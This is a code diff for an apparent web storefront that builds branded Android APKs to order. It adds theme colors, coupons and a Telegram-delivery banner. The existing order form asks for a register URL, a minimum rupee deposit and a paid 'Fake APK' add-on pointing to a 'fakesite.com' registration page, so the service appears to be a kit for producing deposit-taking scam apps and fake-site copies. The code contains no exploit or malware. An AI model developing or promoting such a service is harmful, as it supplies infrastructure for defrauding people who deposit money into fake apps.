@@ -449,6 +449,16 @@ footer{padding:22px 16px;text-align:center;font-size:11.5px;color:var(--dim)}
     </div>
   </section>
 
+  <section class="hero" style="padding:16px;margin-top:12px">
+    <span class="hero-pill"><svg class="i sm"><use href="#ic-bolt"/></svg>CLIENT GROWTH FEATURES</span>
+    <h2 style="font-size:22px;margin:8px 0">Premium APK marketplace with Telegram delivery.</h2>
+    <div class="hero-stats">
+      <div class="stat"><b>Live Link</b><span>DOMAIN / INVITE UPDATE</span></div>
+      <div class="stat"><b>Telegram</b><span>READY APK ALERT</span></div>
+      <div class="stat"><b>Backup</b><span>SAFE DATA</span></div>
+    </div>
+  </section>
+
   <div class="sec-head" id="designsHead">
     <h2 class="sec-title"><svg class="i"><use href="#ic-layers"/></svg>Templates</h2>
     <div class="sec-sub" id="designCount"></div>
@@ -605,7 +615,7 @@ footer{padding:22px 16px;text-align:center;font-size:11.5px;color:var(--dim)}
         <div class="fsec-head"><span class="n">1</span><div><h4>App Identity</h4><small>Name and icon shown on the phone</small></div></div>
         <div class="form-grid">
           <div class="form-group"><label><svg class="i sm"><use href="#ic-tag"/></svg>App Name</label>
-            <input type="text" id="orderAppName" placeholder="e.g. VIP Panel">
+            <input type="text" id="orderAppName" placeholder="e.g. VIP Panel" oninput="clearTimeout(window.__themeNameTimer);window.__themeNameTimer=setTimeout(updateThemePreview,500)">
             <div class="hint">Package: com.zayro.&lt;appname&gt;</div></div>
           <div class="form-group"><label><svg class="i sm"><use href="#ic-image"/></svg>App Icon</label>
             <input type="file" id="orderIcon" accept="image/*">
@@ -635,6 +645,32 @@ footer{padding:22px 16px;text-align:center;font-size:11.5px;color:var(--dim)}
             <input type="url" id="fakeRegUrl" placeholder="https://fakesite.com/#/register?..." inputmode="url"></div>
         </div>
       </div>
+      <div class="addon-box" id="themeAddonBox">
+        <div class="addon-head" style="cursor:default">
+          <svg class="i sm" style="color:var(--cyan)"><use href="#ic-bolt"/></svg>
+          Theme Color
+          <span class="tag-gold" id="themePriceTag"><svg class="coin-i" style="width:13px;height:13px"><use href="#ic-coin"/></svg>+?</span>
+        </div>
+        <div class="hint" style="margin-left:29px">Default color is free. Any selected/custom color adds admin-set price.</div>
+        <div id="themePalette" style="display:flex;gap:8px;flex-wrap:wrap;margin:12px 0 10px 29px"></div>
+        <div style="display:flex;gap:8px;align-items:center;margin-left:29px;flex-wrap:wrap">
+          <button class="btn btn-outline btn-sm" type="button" onclick="openNativeColorPicker()">Choose More Color</button>
+          <input type="color" id="themeColorPicker" value="#00e5ff" style="width:48px;height:34px;padding:0;border-radius:10px" onchange="selectThemeColor(this.value)">
+          <span class="hint" id="themeHint">Default selected</span>
+        </div>
+        <div style="margin-top:12px;border:1px solid var(--border-soft);border-radius:14px;overflow:hidden;background:#050816">
+          <div style="display:flex;align-items:center;justify-content:space-between;padding:9px 11px;border-bottom:1px solid var(--border-soft);font-size:12px;color:var(--dim)"><b style="color:var(--cyan)">Live HTML Preview</b><span id="themePreviewStatus">Default</span></div>
+          <iframe id="themePreviewFrame" title="Theme live preview" sandbox="allow-scripts allow-same-origin" style="width:100%;height:300px;border:0;background:#000;display:block"></iframe>
+        </div>
+      </div>
+      <div class="form-group">
+        <label><svg class="i sm"><use href="#ic-tag"/></svg>Coupon Code <small>(optional)</small></label>
+        <div style="display:flex;gap:8px">
+          <input type="text" id="couponCode" placeholder="WELCOME10" style="text-transform:uppercase">
+          <button class="btn btn-outline btn-sm" type="button" onclick="applyCoupon(this)">Apply</button>
+        </div>
+        <div class="hint" id="couponHint">Discount coupons are set by admin.</div>
+      </div>
       <div class="cost-bar">
         <span class="cb"><span class="k">Cost</span><svg class="coin-i"><use href="#ic-coin"/></svg><b id="orderCost" style="color:var(--gold)">—</b></span>
         <span class="cb"><span class="k">Balance</span><svg class="coin-i"><use href="#ic-coin"/></svg><b id="orderBalance" style="color:var(--cyan)">—</b></span>
@@ -653,6 +689,8 @@ footer{padding:22px 16px;text-align:center;font-size:11.5px;color:var(--dim)}
         <div class="confirm-row"><span class="label">Register URL</span><span class="val" id="cnfUrl" style="font-size:12px;color:var(--dim)">—</span></div>
         <div class="confirm-row"><span class="label">Min Deposit</span><span class="val" id="cnfDeposit">—</span></div>
         <div class="confirm-row"><span class="label">Fake APK</span><span class="val" id="cnfFake">—</span></div>
+        <div class="confirm-row"><span class="label">Theme Color</span><span class="val" id="cnfTheme">—</span></div>
+        <div class="confirm-row"><span class="label">Coupon Discount</span><span class="val" id="cnfDiscount">—</span></div>
       </div>
       <div class="confirm-cost-row">
         <span class="lbl">Total Cost</span>
@@ -737,7 +775,9 @@ footer{padding:22px 16px;text-align:center;font-size:11.5px;color:var(--dim)}
 <script>
 let currentUser=null,currentDesign=null,currentPreviewDesign=null;
 let designCatalog=new Map();
-let fakeAddonPrice=5,domainChangePrice=10,inviteCodeChangePrice=10,coinRate=1;
+let fakeAddonPrice=5,domainChangePrice=10,inviteCodeChangePrice=10,themeColorPrice=10,coinRate=1;
+let appliedCoupon={code:'',discount:0,total:null};
+let selectedThemeColor='';
 let buildStepIdx=0,buildTimeouts=[],buildPollTimer=null,buildStepTimer=null;
 let buildFinished=false,buildToken=0,buildRunning=false;
 const STEP_COUNT=5,STEP_DELAYS=[0,8000,20000,35000,52000];
@@ -984,22 +1024,71 @@ async function selectDesign(id,designData=null){
   $('orderCost').textContent=d.price_coins;
   $('orderBalance').textContent=currentUser.coins;
   fakeAddonPrice=d.fake_price_coins>0?d.fake_price_coins:5;
+  try{const s=await api('/api/settings/payment');themeColorPrice=parseInt(s.theme_color_price||10)||0;}catch(e){}
   $('fakeAddonPriceTag').innerHTML=coin(13)+'+'+fakeAddonPrice;
+  $('themePriceTag').innerHTML=coin(13)+'+'+themeColorPrice;
   $('fakeAddonCheck').checked=false;
   $('fakeUrlBox').style.display='none';
   $('fakeAddonBox').classList.remove('active');
-  ['orderAppName','orderRegUrl','orderIcon','fakeRegUrl'].forEach(i=>$(i).value='');
+  ['orderAppName','orderRegUrl','orderIcon','fakeRegUrl','couponCode'].forEach(i=>$(i).value='');
+  appliedCoupon={code:'',discount:0,total:null};
+  selectedThemeColor='';
+  $('couponHint').textContent='Discount coupons are set by admin.';
   $('orderMinDeposit').value='300';
+  renderThemePalette();
+  updateThemePreview();
   $('orderFormView').style.display='block';
   $('orderConfirmView').style.display='none';
   openModal('orderModal');
+}
+function resetCouponHint(msg='Discount coupons are set by admin.'){
+  appliedCoupon={code:'',discount:0,total:null};
+  $('couponHint').textContent=msg;
+}
+function currentSubtotal(){return (currentDesign?Number(currentDesign.price_coins)||0:0)+($('fakeAddonCheck').checked?fakeAddonPrice:0)+(selectedThemeColor?themeColorPrice:0);}
+function updateOrderCost(){
+  const total=appliedCoupon.total!==null?appliedCoupon.total:currentSubtotal();
+  $('orderCost').textContent=total;
+}
+function renderThemePalette(){
+  const colors=[['','Default'],['#ef233c','Red'],['#00e5ff','Cyan'],['#22c55e','Green'],['#8b5cf6','Purple'],['#f59e0b','Gold'],['#ff4fd8','Pink']];
+  $('themePalette').innerHTML=colors.map(([c,n])=>`<button type="button" class="btn btn-sm ${selectedThemeColor===c?'btn-primary':'btn-outline'}" onclick="selectThemeColor('${c}')" style="${c?`border-color:${c};color:${selectedThemeColor===c?'#fff':c}`:''}">${c?`<span style="width:12px;height:12px;border-radius:50%;background:${c};display:inline-block"></span>`:''}${n}</button>`).join('');
+  $('themeAddonBox').classList.toggle('active',!!selectedThemeColor);
+  $('themeHint').textContent=selectedThemeColor?`Selected ${selectedThemeColor} (+${themeColorPrice} coins)`:'Default selected';
+  $('themePreviewStatus').textContent=selectedThemeColor||'Default';
+}
+function selectThemeColor(color){
+  selectedThemeColor=/^#[0-9a-fA-F]{6}$/.test(color||'')?color.toUpperCase():'';
+  resetCouponHint('Coupon reset. Apply again after changing theme.');
+  renderThemePalette();updateOrderCost();updateThemePreview();
+}
+function openNativeColorPicker(){$('themeColorPicker').click();}
+function updateThemePreview(){
+  if(!currentDesign?.id)return;
+  const app=encodeURIComponent($('orderAppName').value.trim()||'Preview App');
+  const color=encodeURIComponent(selectedThemeColor||'');
+  $('themePreviewFrame').src=`/api/designs/${currentDesign.id}/theme-preview?color=${color}&app_name=${app}`;
 }
 function toggleFakeAddon(){
   const checked=$('fakeAddonCheck').checked;
   $('fakeUrlBox').style.display=checked?'block':'none';
   $('fakeAddonBox').classList.toggle('active',checked);
-  const base=currentDesign?currentDesign.price_coins:0;
-  $('orderCost').textContent=base+(checked?fakeAddonPrice:0);
+  resetCouponHint('Coupon reset. Apply again after changing add-ons.');
+  updateOrderCost();
+}
+async function applyCoupon(btn){
+  const code=$('couponCode').value.trim().toUpperCase();
+  if(!code)return toast('Enter coupon code',true);
+  const subtotal=currentSubtotal();
+  setLoading(btn,true,'Checking...');
+  const d=await api('/api/coupons/validate','POST',{code,subtotal});
+  setLoading(btn,false);
+  if(d.error){appliedCoupon={code:'',discount:0,total:null};$('couponHint').textContent=d.error;return toast(d.error,true);}
+  appliedCoupon={code:d.code,discount:Number(d.discount)||0,total:Number(d.total)};
+  $('couponCode').value=d.code;
+  $('orderCost').textContent=d.total;
+  $('couponHint').innerHTML=`Applied ${esc(d.code)} — saved ${d.discount} coins`;
+  toast('Coupon applied!');
 }
 function previewOrder(){
   const appName=$('orderAppName').value.trim(),regUrl=$('orderRegUrl').value.trim();
@@ -1008,7 +1097,8 @@ function previewOrder(){
   if(!appName)return toast('App name is required',true);
   if(!regUrl)return toast('Register URL is required',true);
   if(fakeAddon&&!fakeUrl)return toast('Fake site register URL is required',true);
-  const total=currentDesign.price_coins+(fakeAddon?fakeAddonPrice:0);
+  const subtotal=currentSubtotal();
+  const total=appliedCoupon.total!==null?appliedCoupon.total:subtotal;
   if(currentUser.coins<total){
     closeModal('orderModal');
     toast(`Need ${total} coins, you have ${currentUser.coins}. Add coins first.`,true);
@@ -1019,6 +1109,8 @@ function previewOrder(){
   $('cnfUrl').textContent=regUrl;
   $('cnfDeposit').textContent='₹'+minDep;
   $('cnfFake').textContent=fakeAddon?`Yes (+${fakeAddonPrice}) — ${fakeUrl}`:'No';
+  $('cnfTheme').textContent=selectedThemeColor?`${selectedThemeColor} (+${themeColorPrice})`:'Default (free)';
+  $('cnfDiscount').textContent=appliedCoupon.discount>0?`${appliedCoupon.code} (-${appliedCoupon.discount} coins)`:'No coupon';
   $('cnfCost').textContent=total;
   $('cnfAfter').textContent=(currentUser.coins-total)+' coins';
   $('orderFormView').style.display='none';
@@ -1039,6 +1131,8 @@ async function submitOrder(){
   const fakeAddon=$('fakeAddonCheck').checked;
   fd.append('fake_addon',fakeAddon?'true':'false');
   if(fakeAddon)fd.append('fake_register_url',$('fakeRegUrl').value.trim());
+  if(appliedCoupon.code)fd.append('coupon_code',appliedCoupon.code);
+  if(selectedThemeColor)fd.append('theme_color',selectedThemeColor);
   const iconFile=$('orderIcon').files[0];
   if(iconFile)fd.append('icon',iconFile);
   setLoading(btn,true,'Building...');
@@ -1088,7 +1182,7 @@ function finishSteps(success){
   for(let i=0;i<STEP_COUNT;i++)setStep(i,success?'done':'');
   if(!success)setStep(STEP_COUNT-1,'failed');
   $('buildWarn').style.display='none';
-  $('progressSub').textContent=success?'Your APK is ready to download.':'Something went wrong during the build.';
+  $('progressSub').textContent=success?'Your APK is ready to download.':'Build failed. If coins were deducted, they are refunded automatically.';
 }
 const isDoneStatus=s=>['done','success','successful','completed','complete','ready','finished','built','generated'].includes(String(s||'').toLowerCase());
 const isFailStatus=s=>['failed','fail','error','cancelled','canceled'].includes(String(s||'').toLowerCase());
